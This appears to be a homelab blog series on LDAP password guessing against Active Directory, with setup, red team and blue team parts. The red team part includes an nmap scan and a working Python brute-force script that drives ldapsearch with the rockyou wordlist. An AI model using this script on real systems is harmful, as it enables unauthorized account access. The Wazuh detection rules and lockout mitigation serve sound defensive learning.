---
title: Overview
date: 2025-01-26
draft: false
author: Alex Jenkins
---
# Introduction
- breakdown of the task
- overview of the three articles inc. config, redteam, blueteam
- 

## What is Password Guessing?

## What is LDAP?



- overview of the three different articles including
- config
- red team
- blue team
- what the users are about to read
- what we will be doing (brute forcing LDAP)
- what is LDAP
---

## MITRE ATT&CK Mapping
*** move to the top of the page

| Category      | ID        | Description       |
| ------------- | --------- | ----------------- |
| Tactic        | TA0006    | Credential Access |
| Technique     | T1110     | Brute Force       |
| Sub-Technique | T1110.001 | Password Guessing |

---
title: Configuration
date: 2025-01-26
draft: false
author: Alex Jenkins
---
## Introduction
In this exercise I will be targeting LDAP, which is listed as one of the commonly targeted services in the Password Guessing techniques page on the MITRE ATT&CK framework. 
## Assumptions
1. Active Directory (AD) is installed and running, configured with a Domain Controller (DC).
2. Kali Linux is running and **connected to the same network** as the AD DC.
3. There are no firewall rules that will interfere with connection requests from Kali Linux to your AD server.
## Modify Password Policies
The very first step to this exercise is ensuring a user has been created. It may be necessary to change the default password policy in your AD server to ensure that a vulnerable password may be used. To do that open Group Policy Management Editor, navigate to *Computer Configuration/Policies/Windows Settings/Security Settings/Account Policies/Password Policy* and set the minimum password length to a low value - I've used a length of five. I also took the liberty of disabling the *Password must meet complexity requirements* policy. 

| Policy                                     | Setting      |
| ------------------------------------------ | ------------ |
| minimum password length                    | 5 characters |
| password must meet complexity requirements | disabled     |

## Create a new user
Next, open Active Directory Users and Computers. Locate your domain, right click the *Users* folder, and create a new user. For this exercise I'm going to be using a password from the rockyou wordlist, which is readily available in Kali Linux in */usr/share/wordlists* and just need to be extracted. You can do that with the *gunzip* command. I decided to use the 10th password in this list to simplify testing of blue team's patches. Once you've picked a password fill in the user details, uncheck "User must change password at next logon", and check "Password never expires". It should go without saying that in production environments this is not an ideal setup, but is much more convenient for our use-case. If you want to follow along, these are the credentials I used:

| Field                                   | Value  |
| --------------------------------------- | ------ |
| first name                              | scarab |
| user logon name                         | scarab |
| password                                | abc123 |
| user must change password at next logon | false  |
| password never expires                  | true   |

---
title: Brute Forcing Active Directory LDAP using a Custom Python Script
date: 2025-01-26
draft: false
author: Alex Jenkins
---
## Introduction
In this article we will perform a password guessing attack from the perspective of the adversary. The process begins by using **nmap** to scan the host and determine if the Lightweight Directory Access Protocol (LDAP) port is open. Once the LDAP service has been confirmed, a custom python script will be used to brute force a user's password with **ldapsearch**.

## Assumptions
For this red team exercise, it is assumed that the adversary has performed the initial reconnaissance stage. During that engagement they would have acquired an Active Directory (AD) username, discovered a domain, and located the host's IP address. The next logical step for the adversary is to identify a network entry point.

## LDAP Discovery
As discussed, the tool used to discover the LDAP port status will be nmap. Efforts have been made to ensure the nmap scan does not create too much noise - only scanning the relevant port and address, and revoking ICMP scans. A full example of the scan used during this engagement, including my specific output, and a description of each command is shown below:

**Input**

```
nmap -sT -Pn -p389 192.168.1.138
```

**Output**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 20:00 GMT
Nmap scan report for 192.168.1.138
Host is up (0.00049s latency).

PORT    STATE SERVICE
389/tcp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

**Description**

| Flag | Description                                                                                                                                                                                               |
| ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| sT   | Performs a full three-way TCP handshake, mimicking the normal connection flow of applications and hopefully blending in with legitimate traffic.                                                          |
| Pn   | Based on the assumptions, host discovery is not required and ICMP requests can be deactivated. Ping scans are generally detected and blocked by firewalls so this is generally a good idea in most cases. |
| p389 | Only scan the port of interest. Doing so creates less noise on the host than scanning the top 1,000 most common ports, with the additional benefit of being a faster scan overall.                        |

nmap's output shows that the LDAP port is indeed open on its standard port of 389, which means that it is reachable and we can begin our attack.

## Brute Force
I've decided to use the ldapsearch tool for this attack. This tool is used to open a connection to an LDAP server, bind (or authenticate into the directory server), and perform a search query based on the input. We are interested specifically in **bind** in this case, because a successful authentication will indicate a correctly guessed password.

Let's first go over the ldapsearch command. The following is the exact command I need to use in my environment to login to the scarab user:

``` bash
ldapsearch -H "ldap://192.168.1.138" -D "scarab" -b "DC=backyard,DC=local" -w "abc123"
```

| Flag | Description                                                                                                                                            |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| -H   | Used to specify the LDAP server to connect with. This must be prefixed with ldap://, and followed with an IP address or domain name.                   |
| -D   | The Distinguished Name (DN) of the user aka the username.                                                                                              |
| -w   | The password used to bind. This can be populated using a word-list to automate the process.                                                            |
| -b   | The **base** Domain Name (DN) from which to begin the search. In this case I've chosen the root domain. Omitting this will result in "no such object". |

A successful ldapsearch bind will return directory listings for the given base DN and a return code of 0. This return code is useful because it can be used to determine if a login was successful or not. For example, when a login is unsuccessful with invalid credentials the following output is received: 

```
ldap_bind: Invalid credentials (49)
```

Manually using the ldapsearch command to repeatedly iterate through the rockyou wordlist is tedious and inefficient, so to aid in this process I created a custom python script (shown below). 

```python
import subprocess

password_list = '/usr/share/wordlists/rockyou.txt'
username = 'scarab'
server = '192.168.1.138'

command = ['ldapsearch', 
           '-H', f'ldap://{server}',
           '-D', f'{username}',
           '-b', 'DC=backyard,DC=local',
           ]

with open(password_list) as wordlist:
    
    for password in wordlist:
    
        password = password.strip() # remove whitespace and newlines
        print(f'Trying {password}', end='\r')
        
        command += ['-w', password]
        output = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if output.returncode == 0: # LDAP auth success
            print(f'Matched {password}')
            break
```

Essentially all this python script does is use subprocess to run the ldapsearch tool repeatedly until it finds a password match. It's not super intelligent, if it doesn't find a match it won't tell you - we could modify it to do that but for this exercise this is fine. The script checks for the error code 0 and prints the matched password if the condition is met. The output is suppressed, but can be added back in by modifying the subprocess.run() function if required.

And that's it, within a short space of time the password will be guessed (assuming it exists in the chosen wordlist). The weak password policy and lack of lockout mechanisms make this a trivial exercise, allowing limitless attempts to authenticate into the user despite an array of failed logins.

I hope you enjoyed this example of password guessing and that you found value in the examples and code provided. The purpose of this was to be an introductory exercise using readily available services upon setup of an AD server. This is a very basic example of password guessing, but I feel it has effectively showcased this MITRE technique. This was new to me and I had fun building the python script and learning a little bit about LDAP and how the ldapsearch tool works. 



---
title: Detecting and Mitigating Active Directory LDAP Password Guessing Attacks with Wazuh
date: 2025-01-26
draft: false
author: Alex Jenkins
---
## Assumptions
- Wazuh is configured and listening to AD logs

## Detection
1. Run the brute forcer script from the red teaming exercise
2. Navigate to Explore/Discover in Wazuh
3. Add a filter for 'data.win.eventdata.targetUserName: scarab'
4. Filter for the last hour

After running the ldap_brute_forcer.py script we can see from the logs that there are 9 authentication failures, and one success. This lines up perfectly with the rockyou.txt wordlist, and is showing exactly as expected. Digging into these failed logins further will unveil some key information which describes the failed logins in more detail:

> data.win.eventdata.status: 0xc000006d  
data.win.eventdata.subStatus: 0xc000006a  
data.win.eventdata.targetUserName: scarab  
data.win.eventdata.ipAddress: 192.168.1.236  

This information is important because it describes login failures through the status and substatus codes. It gives information regarding the source IP address of the login failure and the account the logon was attempted for. Status code 0xc000006d is the generic code for a logon failure, stating that the attempted logon is invalid. Microsoft state that "this is either due to a bad username or other authentication information". 0xc000006a is a substatus code for 0xc000006d which elaborates on the authentication failure. This code explains that the value provided as the current password is not correct. One final important bit of information is the logon type. In this case the logon type is 3, which indicates that this is a network logon and not an interactive session.

![Failed Login](/failed_login.png)

The 10th and final event resulting from the brute force script is a logoff event. This is a little strange because I was expecting a logon success, but this appears to be a caveat of ldapsearch and bind. When a bind is performed all it does is prove a user's identity, and there is no persistent "logged in" state. Instead, the ldapsearch command processes the search request and immediately closes the connection. To find out more about this event I grabbed the data.win.system.eventID, which is 4634 in this case, and looked it up in [Microsoft's documentation](learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4634).

![Logoff](/logoff.png)

To summarize: Event code 4634 shows that the logon session was terminated and no longer exists. This code differs from 4647, which is a logoff event initiated by a user directly. This non-user logoff may sometimes be correlated with 4624, which indicates a successful logon. In this case, however, there is no correlation to be found.

The new found information tells me that in future brute force cases I should be suspicious of failed logins followed by a terminated logon session. This is proven by the event logs generated by the LDAP brute forcer, which has managed to successfully guess password credentials, immediately terminating the logon session upon completion. Information like this is important because it can help differentiate a brute force attempt from a normal successful logon, where the user may have incorrectly entered their password before logging in. Another important indicator to consider for brute force attempts is the timestamp of each event. In this case, the difference in event timestamps are a matter of milliseconds. The frequency of login failures is far too high to be human error and is indicative of a computer-aided operation.

### Rule Creation
Now that we've gone through and manually detected the attack, we can grab our key data that we noted at the beginning and start to write some detection rules. These will alert us whenever this type of activity is seen again. In Wazuh, this can be done by navigating to the "Monitors" tab under Explore/Alerting, then clicking "Create monitor". I'll include screenshots of my configurations as we go with little explanations as to why I've made some of my decisions.

![Monitor Details](/monitor_details.png)

Most of this is default with the exception of the frequency. Obviously this is up to you, but I like to be reminded every 30 minutes if a brute force is detected. My reasoning is that I want response time to be quick for a brute force detection, because any delay could lead to an account compromise. If you wait too long between alerts it could already be too late by the time it comes through. If you want it sooner for testing purposes you can run it every minute.

![Select Data](/select_data.png)

Most of this is default, I've made the time field the timestamp because that just felt the most logical, and I've used the * wildcard for indexes to include them all.

![Query](/query.png)

The query section is the fun part. I would recommend first setting the time range to the same as the time in your monitor details so that you don't get spammed with alerts. We're filtering for the status and substatus codes, and counting the number of substatus codes. This count will allow us to create a detection rule based on the number of login failures, grouped on the IP address. With the count setup you can make a trigger rule.

![Trigger Rule](/trigger.png)

And there you go. The rule is setup. You can make an action if you want which will notify you whenever this alert is triggered, I like to have mine notify me on my phone through Slack, but that is outside the scope of this lab. Once you save this monitor an alert will be triggered every time 5 failures, grouped by IP address, are detected with the substatus 0xc000006a. Now run your script again to check to see if it works, you should see at least one alert (don't forget to wait the time you allocated to the monitor).

![Alerts](/alert.png)

Great. That's the detection rule setup, but what about mitigation?

## Mitigation
So MITRE explains that there are 4 ways of mitigating this type of threat: 

1. Account Use Policies  
Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. Consider blocking risky authentication requests, such as those originating from anonymizing services/proxies.

2. Multi-Factor Authentication (MFA)  
Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.

3. Password Policies  
Refer to NIST guidelines when creating password policies.

4. Update Software  
Upgrade management services to the latest supported and compatible version. Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords.

The simplest seems to be password policies. Obviously for this practice we made the password policy intentionally weak, so the simple solution would be to increase password length and complexity. Other methods include enforcing MFA on accounts, which is always a good method and in my opinion should be mandatory for all users. Single-factor authentication methods are considered legacy authentication systems, and are inherently vulnerable to brute force attacks. Account lockout policies are another great method, locking the account and making it unusable if a threshold of failed login attempts is reached. This method can be inconvenient for the user if other mechanisms are not in place, as it could restrict access to their account. Other methods include restricting access to geographical zones, only allowing logins from specific IPs, or blocking IP addresses outright if found to be malicious. Whilst these last 3 methods do have their benefits, I will not be doing this because it will hinder future red team assessments.

Given my current constraints I will be enforcing account lockout. There are three reasons for this:

1. It is one of simplest methods of defence against brute force and will display some new event logs for research.
2. Changing the password policies would require a password change, requiring modifications to the brute force script. 
3. Adopting MFA in a local Active Directory environment requires the installation of a third-party client, which is honestly more hassle than its worth for a homelab.

To change the account lockout policy open the Group Policy Management Editor in Windows Server, and navigate to Computer Configuration/Policies/Windows Settings/Security Settings/Account Policies/Account Lockout Policy. I've configured mine to lockout the account for 30 minutes if more than 5 invalid logon attempts are made. The counter will reset after another 30 minutes. 

Now when the script is run it continues running beyond the correct password, never completing because the account gets locked before it can successfully authenticate. When looking at this in Wazuh an event can be found showing that the account was locked out with the [Event ID 4740](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4740).

![Account Lockout](/account_lockout.png)

This event shows that the mitigation was successful, and that this method of brute force no longer works. Obviously this has limitations, and the attacker could still have gained access if they guessed correctly within the first 4 attempts, but with stronger password policies the likelihood of guessing this correctly is very low. If you wish to adopt stronger password policies I recommend following the most up-to-date [NIST Guidelines](https://pages.nist.gov/800-63-4/sp800-63b.html) to understand what makes a strong password, as this is subject to change.

I hope you found value in this blue team exercise. It was a rather trivial example, again showcasing a basic technique for gaining a foothold into an account or network. Nevertheless it was good for me to practice and I hope you followed along and learned something too.